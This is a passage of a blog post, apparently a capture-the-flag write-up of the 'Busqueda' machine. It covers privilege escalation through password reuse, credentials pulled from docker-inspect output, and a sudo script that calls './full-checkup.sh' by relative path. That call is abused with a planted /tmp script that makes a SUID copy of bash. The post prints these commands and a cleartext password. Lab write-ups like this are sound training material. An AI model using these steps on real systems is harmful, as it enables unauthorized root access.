+</span></span><span style="display:flex;"><span>        merge <span style="color:#f92672">=</span> refs/heads/main
+</span></span></code></pre></div><p>Using this password we can log into gitea but it&rsquo;s just source of the searcher site and nothing more. But as the cody .gitconfig was in the user home directory I thought it might be the users password too and I was right.</p>
+<p>So first thing to do for priv-esc that wasn&rsquo;t possible before is</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>bash-5.1$ sudo -l 
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> svc: jh1usoih2bkjaspwe92
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> svc on busqueda:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User svc may run the following commands on busqueda:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /usr/bin/python3 /opt/scripts/system-checkup.py *
+</span></span></code></pre></div><p>And yesss there is a command to run as root🥳 but let&rsquo;s not count chickens before they hatch and see what does the command do.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+</span></span><span style="display:flex;"><span>Usage: /opt/scripts/system-checkup.py &lt;action&gt; <span style="color:#f92672">(</span>arg1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>arg2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     docker-ps     : List running docker containers
+</span></span><span style="display:flex;"><span>     docker-inspect : Inpect a certain docker container
+</span></span><span style="display:flex;"><span>     full-checkup  : Run a full system checkup
+</span></span></code></pre></div><p>Ok I&rsquo;ll admit it I got excited too soon there still a couple of things to do.</p>
+<p>Well the full-checkup gives <code>Something went wrong</code>, docker-ps shows there is two container running and doesn&rsquo;t use the arguments provided.</p>
+<p>Last but not least docker-inspect the most interesting one.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
+</span></span><span style="display:flex;"><span>Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;
+</span></span></code></pre></div><p>After reading about format in docker-inspect manual I thought I might be able to get a shell somehow using an command injection but I couldn&rsquo;t do that so dove more into documentation and started reading every config that docker-inspect gave me using the format &ldquo;{{json .}}&rdquo; and <strong>BINGO</strong>.
+<img loading="lazy" src="/b/images/busqueda-docker.png" alt="docker-inspect-creds"  title="Creds in docker-inspect"  />
+
+It&rsquo;s database credentials and we can log into mysql using <code>mysql -u gitea -h 127.0.0.1 -p</code> but even though the hash of administrator is in there but it&rsquo;s not crackable. As the way the user cody password found I tried the same password on administrator account and it worked.</p>
+<p>There is another private repository in administrator account which is the scripts in /opt folder and the source of the script that we can run using sudo. Let&rsquo;s see what are we running.
+<img loading="lazy" src="/b/images/busqueda-source.png" alt="Source of sudo script"  title="Source code of sudo script"  />
+
+Can you see where is the vulnerability and why we kept getting <code>something went wrong</code> when trying <code>full-checkup</code>? Because of <code>./full-checkup.sh</code> running the sudo command in <code>/opt/scripts</code> will do as it should but in <code>/tmp</code> with our malicious script? It&rsquo;ll give us root access.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>cp /bin/bash /tmp
+</span></span><span style="display:flex;"><span>chmod +s /tmp/bash
+</span></span></code></pre></div><p>this script will copy bash in tmp and add suid permission to it and we can get root using <code>/tmp/bash -p</code> and get root flag ;)
+<img loading="lazy" src="/b/images/busqueda-root.png" alt="Root Access"  title="Root Access"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://me.dgidc.ir/b/posts/1/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Hello World</span>
+  </a>
+  <a class="next" href="https://me.dgidc.ir/b/posts/3/">
+    <span class="title">Next »</span>
+    <br>
+    <span>PWN - Stack binary exploiting Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://me.dgidc.ir/b/">D4rkNebula Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
